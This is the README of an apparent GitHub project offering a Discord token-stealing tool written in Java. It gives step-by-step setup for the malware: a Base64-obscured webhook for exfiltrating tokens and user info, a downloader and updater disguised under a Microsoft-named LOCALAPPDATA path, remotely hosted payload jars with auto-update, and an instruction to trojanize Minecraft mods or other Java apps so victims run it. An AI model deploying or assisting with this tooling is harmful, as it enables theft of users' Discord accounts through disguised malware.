Simple Discord token logging utility written in Java.
# Features
 - Log tokens saved by Discord clients in LevelDB files
 - Gather user info through the token and send it to a webhook in an embed of your choice
 - Auto-update functionality
# Requirements
 - Java 11+
 - Jackson
 - JNA-Platform
# Usage
1. *(Optional)* Change the path the Updater will be downloaded to in **ClientTokenGrabber.java**
    ```java
    public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    ```
2. Encode your webhook in Base64 for minimal security and paste it in **ClientTokenGrabber.java**
    ```java
    public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
    ```
3. *(Optional)* Change the path the Application will be downloaded to in **Updater.java**
    ```java
    private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
    ```
4. Host a file containing the version and download link to the main Application jar information just like in [/examples/Version Info](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Version%20Info) (link should not be filled out yet)
    ```json
    {
        "version": 1,
        "link": ""
    }
    ```
5. Change the link in **UpdateHelper.java** to that
    ```java
    private static final String INFO_URL = "https://raw.githubusercontent.com/0x5d0/Discord-Client-Token-Logger/master/examples/Version%20Info";
    ```
6. Compile the **Updater**
7. Host the Updater jar just like in [/examples/Update.jar](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar)
8. Change the link in **ClientTokenGrabber.java** to that
    ```java
    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
    ```
9. Change the link in **Downloader.java** to that as well
    ```java
    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
    ```
10. *(Optional)* Change the path the Updater will be downloaded to in **Downloader.java** (should be the same as step one)
    ```java
    private static final String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    ```
11. Trojanize your preferred app (Minecraft mod/any Java app) with the Downloader source and compile it (uses no external libraries)
12. Compile the **ClientTokenGrabber.java**
13. Host the compiled ClientTokenGrabber jar just like in [/examples/Application.jar](https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Application.jar)
14. Go back to step 4 and change the "link" field to where the ClientTokenGraber jar is hosted
    ```json
    {
        "version": 1,
        "link": "https://raw.githubusercontent.com/0x5d0/Discord-Client-Token-Logger/master/examples/Update.jar"
    }
    ```
15. Run the Downloader jar or the trojanized app and your Discord token and related user information will be sent to your webhook
## Auto-Update
- ### Application
    To distribute updates to all instances of your application, you must first locate and update the version number in the **UpdateHelper** class to a higher value than the current one.This version number will help identify whether an update is available. You can then make the necessary changes to your main application and build it. Finally, host the new version and update the version information file to reflect these changes. This file serves as a reference for your application to determine whether an update is needed.
    
    *Be cautious when updating the version number. If the version number specified in the UpdateHelper class is smaller than the one in the version information file, the Application and Updater will enter a loop of downloading and deleting each other continuously. Make sure to keep the version numbers consistent to avoid this issue.*
- ### Updater
    To distribute new versions of the updater itself, simply build it with the necessary changes and replace the old file with it. The main application will download it the next time an update is needed.
    
    *If you cannot get the same URL for the updater as before, you will have to push a dummy update of the main application with a higher version number and the link to the new updater jar. In general, if you do not own a server, it would be good practice to host the files on GitHub and update them through that to retain the same URLs.*